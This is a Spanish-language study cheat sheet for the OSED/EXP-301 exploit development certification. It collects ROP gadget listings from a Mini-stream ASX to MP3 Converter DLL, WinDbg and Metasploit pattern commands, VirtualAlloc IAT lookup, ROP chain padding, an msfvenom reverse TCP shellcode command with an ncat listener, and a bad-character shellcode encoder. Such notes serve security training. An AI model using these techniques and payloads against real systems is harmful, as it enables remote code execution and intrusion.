Algunos Tips y comandos a tener en cuenta, en la certificación OSED/EXP-301
```
Prevención de Ejecución de Datos (DEP)
Aleatorización de la Dirección del Espacio de Memoria (ASLR)
Control de Flujo de Guardia (CFG)

- subir y bajar procesos
Win+R -> services.msc

P/P/R
58 ==> pop eax
5B ==> pop ebx
59 ==> pop ecx
5A ==> pop edx
5E ==> pop esi
5F ==> pop edi
5D ==> pop ebp
C3 ==> ret
```
- Comandos de los scripts
```
python generar_bytearray.py
Generated bytearray:
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

----
python analyze_rop.py -h                  
usage: analyze_rop.py [-h] [--describe] [--categorize] [--recommend-pop] [--recommend-ret] [--recommend-jmp]
                      [--recommend-push] [--detect-inc-ret] [--recommend-inc] [--filter-xchg] [--output OUTPUT]
                      [--min-instr MIN_INSTR] [--max-instr MAX_INSTR]
                      rop_file

Analizador y Recomendador de Gadgets ROP.

positional arguments:
  rop_file              Ruta al archivo rop.txt generado por rp++.

options:
  -h, --help            show this help message and exit
  --describe            Describir todos los gadgets con detalles.
  --categorize          Agrupar gadgets por categorías.
  --recommend-pop       Recomendar gadgets que contienen instrucciones POP o PUSH.
  --recommend-ret       Recomendar gadgets que terminan con RET.
  --recommend-jmp       Recomendar gadgets que contienen JMP.
  --recommend-push      Recomendar gadgets que comienzan con PUSH ESP.
  --detect-inc-ret      Detectar gadgets que contienen "inc <reg> ; ret".
  --recommend-inc       Recomendar gadgets que realizan incrementos o decrementos.
  --filter-xchg         Filtrar gadgets que comienzan con la instrucción XCHG.
  --output OUTPUT       Guardar la salida en un archivo de texto.
  --min-instr MIN_INSTR
                        Número mínimo de instrucciones por gadget.
  --max-instr MAX_INSTR
                        Número máximo de instrucciones por gadget.

python analyze_rop.py rop.txt --recommend-push

Gadgets Recomendados: Gadgets que comienzan con PUSH ESP.
--------------------------------------------------------------------------------
0x50527874: push esp ; aam 0x55 ; push eax ; ret  ;  (1 found)
0x50510f1f: push esp ; adc al, 0x02 ; add cl, cl ; retn 0x001C ;  (1 found)
0x505273e3: push esp ; adc dword [ebx+edi], ecx ; retn 0x1B7D ;  (1 found)
0x5053143d: push esp ; and al, 0x04 ; mov byte [edx+ecx], 0x00000003 ; inc dword [eax] ; ret  ;  (1 found)
0x50515664: push esp ; and al, 0x04 ; mov dword [ecx+eax*4], edx ; inc dword [esi+0x0000017C] ; ret  ;  (1 found)
0x5051e1a6: push esp ; and al, 0x08 ; ret  ;  (1 found)
0x50540b53: push esp ; and al, 0x10 ; mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
0x50543576: push esp ; and al, 0x10 ; mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
0x505465c0: push esp ; and dl, byte [ebp+0x50] ; push dword [0x5055E078] ; mov dword [0x5055DF7C], eax ; call esi ;  (1 found)
0x50546434: push esp ; and edx, dword [ebp+0x50] ; push dword [0x5055E078] ; mov dword [0x5055DF24], eax ; call esi ;  (1 found)
0x5054650c: push esp ; fist word [ebp+0x50] ; push 0x505522E4 ; push dword [0x5055E078] ; call esi ;  (1 found)
0x50520982: push esp ; mov dword [eax+0x5C], ecx ; mov dword [eax+0x58], ecx ; ret  ;  (1 found)
0x505181cb: push esp ; mov dword [edi+0x7C], eax ; call dword [eax+0x10] ;  (1 found)
0x5052dcb8: push esp ; mov dword [esi+0x58], ebx ; mov dword [esi+0x5C], edi ; call dword [esi+0x48] ;  (1 found)
0x505010f5: push esp ; mov eax, dword [0xFF835054] ; push dword [esp+edx+0x57] ; call dword [0x5054A158] ;  (1 found)
0x50526713: push esp ; mov eax, dword [edi] ; push esi ; push edi ; call dword [eax+0x18] ;  (1 found)
0x50520a65: push esp ; pop edi ; pop esi ; leave  ; ret  ;  (1 found)

python analyze_rop.py rop.txt --categorize
Gadgets Agrupados por Categorías:
================================================================================

=== BANDERA DE DIRECCIÓN ===
==========================
0x50508d1a: add al, 0x6A ; cld  ; push dword [eax] ; call dword [0x5054A284] ;  (1 found)
0x50508e54: add al, 0x6A ; cld  ; push dword [eax] ; call dword [0x5054A284] ;  (1 found)
0x5053261e: add al, byte [ebx-0x778DF707] ; std  ; rep movsd  ; cld  ; jmp dword [0x505326D0+edx*4] ;  (1 found)
0x5053298e: add al, byte [ebx-0x778DF707] ; std  ; rep movsd  ; cld  ; jmp dword [0x50532A40+edx*4] ;  (1 found)
0x5050f0e2: add byte [ebx+0x75FF0CC4], al ; cld  ; call dword [0x5054A0D8] ;  (1 found)
0x50508607: add byte [ecx+0x75FFFC45], cl ; cld  ; call edi ;  (1 found)
0x5052babd: add byte [esi-0x18], dl ; cld  ; push 0xC4830000 ; adc al, 0x5E ; ret  ;  (1 found)
0x50508605: add dword [eax], eax ; add byte [ecx+0x75FFFC45], cl ; cld  ; call edi ;  (1 found)

=== CONTROL DE FLUJO ===
======================
0x505062c0: aaa  ; add byte [eax], al ; call dword [0x5054A188] ;  (1 found)
0x505072fa: aaa  ; add byte [eax], al ; call dword [0x5055CA10] ;  (1 found)
0x5050733a: aaa  ; add byte [eax], al ; call dword [0x5055CA10] ;  (1 found)
0x5050735c: aaa  ; add byte [eax], al ; call dword [0x5055CA14] ;  (1 found)
0x50507169: aaa  ; add byte [eax], al ; push ebx ; call dword [0x5054A098] ;  (1 found)
0x505212fe: aaa  ; add byte [ecx+0x3707D6C6], al ; ret  ;  (1 found)
0x5051ec12: aaa  ; add dword [eax], eax ; add esp, 0x0C ; pop ebp ; ret  ;  (1 found)
0x505235f7: aaa  ; and eax, dword [eax] ; add byte [ecx+0x59], bl ; leave  ; ret  ;  (1 found)
0x50547213: aaa  ; lea eax, dword [ebp-0x40] ; push eax ; call dword [0x5054A268] ;  (1 found)
0x50525142: aaa  ; mov eax, edi ; pop edi ; ret  ;  (1 found)
0x50520195: aaa  ; movsx eax, word [eax+0x02] ; pop esi ; ret  ;  (1 found)

```
- Probar manualmente en WinDbg que DEP está habilitado
```
ed esp 90909090
r eip = esp
p
```
- Patrones de Metasploit
```
msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q 43387143
```
- Buscar el IAT en VirtualAlloc
```
Fácil con IDA Pro en los imports 

Forma normal de buscar el IAT que es la dirección del VirtualAlloc(IAT)
!dh MSA2Mfilter03.dll
	   4F000 [     188] address [size] of Import Address Table Directory
dds  MSA2Mfilter03+4F000
	1004f060  7746f660 KERNEL32!VirtualAllocStub
u 0x1004f060
```
- Este código es un apoyo para encontrar el mejor valor para los gadgets del EIP. En Sublime Text con el REGEX:
```
(\<push esp\>.*\<pop esi\>)
```
- POP EBX y POP ESI eliminarán los gadgets posteriores, por lo que se añade lo siguiente
```
ecx = pack("<I",0x50501133)  # XOR ECX,ECX # MOV EAX,ECX # POP EBX # POP ESI # RETN
ecx += pack('<L',0x41414141) # Relleno para instrucción pop ebp
ecx += pack('<L',0x41414141) # Relleno para instrucción pop esi
```
- Sacar los Gadgets con rp++
```
copy "C:\Program Files (x86)\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll" .
rp-win-x86.exe -f MSA2Mfilter03.dll -r 5 > rop.txt
```
- Para la Shellcode con MSF
```
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -b "\x00\x0a" -v shellcode
ncat -lvp 4444
```
- Automatización de la codificación del lab de offsec
```
Esto se uso cuando msf el shellcode no funciona, por bytes los nulos
		
def mapBadChars(sh):
	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
	i = 0
	badIndex = []
	while i < len(sh):
		for c in BADCHARS:
			if sh[i] == c:
				badIndex.append(i)
		i=i+1
	return badIndex
	
def encodeShellcode(sh):
	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
	REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
	encodedShell = sh
	for i in range(len(BADCHARS)):
		encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
	return encodedShell

```

```
Referencias:
https://hacktips.it/tags/osed/
https://github.com/nop-tech/OSED
https://github.com/epi052/osed-scripts
https://defuse.ca/online-x86-assembler.htm#disassembly
https://github.com/tjcim/rop_regexr
https://github.com/mzdaemon/URLDownloadToFileAShellcode
https://initroot.me/shellcode-methodology
```
